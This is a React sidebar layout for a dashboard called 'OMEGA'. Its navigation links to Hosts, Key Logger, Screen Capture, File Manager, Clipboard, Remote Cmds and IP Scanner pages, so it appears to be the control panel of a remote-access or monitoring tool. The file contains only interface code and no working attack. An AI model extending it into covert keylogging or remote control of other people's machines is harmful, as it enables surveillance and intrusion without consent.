import { useState } from "react";
import { Link, useLocation } from "wouter";
import {
  Activity, Server, LayoutDashboard, TerminalSquare, Menu, X,
  KeyRound, Camera, FolderOpen, MessageSquare, ScanLine, Network, Cpu,
  Monitor, AppWindow, Clipboard, MessageSquareWarning, Command
} from "lucide-react";
import { Button } from "@/components/ui/button";

interface LayoutProps {
  children: React.ReactNode;
}

const NAV_GROUPS = [
  {
    label: "SYSTEM",
    items: [
      { name: "Overview",    href: "/",            icon: LayoutDashboard },
      { name: "Hosts",       href: "/hosts",       icon: Server },
      { name: "Events",      href: "/events",      icon: Activity },
      { name: "System Info", href: "/system-info", icon: Monitor },
    ],
  },
  {
    label: "TOOLS",
    items: [
      { name: "Chat",           href: "/chat",           icon: MessageSquare },
      { name: "Key Logger",     href: "/keylogger",      icon: KeyRound },
      { name: "Screen Capture", href: "/screen-capture", icon: Camera },
      { name: "File Manager",   href: "/file-manager",   icon: FolderOpen },
      { name: "Processes",      href: "/processes",      icon: Cpu },
      { name: "Windows",        href: "/windows",        icon: AppWindow },
      { name: "Clipboard",      href: "/clipboard",      icon: Clipboard },
    ],
  },
  {
    label: "CONTROL",
    items: [
      { name: "Message Mgr",    href: "/message-manager",  icon: MessageSquareWarning },
      { name: "Remote Cmds",    href: "/remote-commands",  icon: Command },
    ],
  },
  {
    label: "NETWORK",
    items: [
      { name: "IP Scanner", href: "/ip-scanner", icon: ScanLine },
      { name: "IP Tool",    href: "/ip-tool",    icon: Network },
    ],
  },
];

export function Layout({ children }: LayoutProps) {
  const [location] = useLocation();
  const [mobileMenuOpen, setMobileMenuOpen] = useState(false);

  const isActive = (href: string) =>
    href === "/" ? location === "/" : location.startsWith(href);

  return (
    <div className="min-h-screen bg-background flex flex-col md:flex-row">
      {/* Mobile header */}
      <div className="md:hidden flex items-center justify-between p-4 border-b border-border bg-card">
        <div className="flex items-center gap-2">
          <TerminalSquare className="w-6 h-6 text-primary" />
          <span className="font-bold text-lg tracking-tight text-primary">OMEGA</span>
        </div>
        <Button variant="ghost" size="icon" onClick={() => setMobileMenuOpen(!mobileMenuOpen)}>
          {mobileMenuOpen ? <X className="w-6 h-6" /> : <Menu className="w-6 h-6" />}
        </Button>
      </div>

      {/* Sidebar */}
      <div className={`
        ${mobileMenuOpen ? "flex" : "hidden"}
        md:flex flex-col w-full md:w-56 bg-card border-r border-border md:min-h-screen shrink-0
      `}>
        <div className="hidden md:flex items-center gap-2 p-5 border-b border-border">
          <TerminalSquare className="w-5 h-5 text-primary" />
          <span className="font-bold text-lg tracking-tight text-primary">OMEGA</span>
        </div>

        <nav className="flex-1 p-3 space-y-4 overflow-y-auto">
          {NAV_GROUPS.map(group => (
            <div key={group.label}>
              <p className="text-[10px] font-semibold text-muted-foreground/60 tracking-widest px-3 mb-1">
                {group.label}
              </p>
              <div className="space-y-0.5">
                {group.items.map(item => (
                  <Link
                    key={item.name}
                    href={item.href}
                    className={`
                      flex items-center gap-2.5 px-3 py-2 rounded-md transition-colors text-sm
                      ${isActive(item.href)
                        ? "bg-primary/10 text-primary border border-primary/20"
                        : "text-muted-foreground hover:text-foreground hover:bg-accent"}
                    `}
                    onClick={() => setMobileMenuOpen(false)}
                  >
                    <item.icon className="w-4 h-4 shrink-0" />
                    <span className="font-medium truncate">{item.name}</span>
                  </Link>
                ))}
              </div>
            </div>
          ))}
        </nav>

        <div className="p-4 border-t border-border">
          <div className="text-xs text-muted-foreground flex items-center gap-2">
            <div className="w-2 h-2 rounded-full bg-primary animate-pulse" />
            SYSTEM ONLINE
          </div>
        </div>
      </div>

      {/* Main content */}
      <main className="flex-1 flex flex-col min-w-0 overflow-hidden">
        <div className="flex-1 overflow-y-auto p-4 md:p-8">
          <div className="max-w-7xl mx-auto">
            {children}
          </div>
        </div>
      </main>
    </div>
  );
}
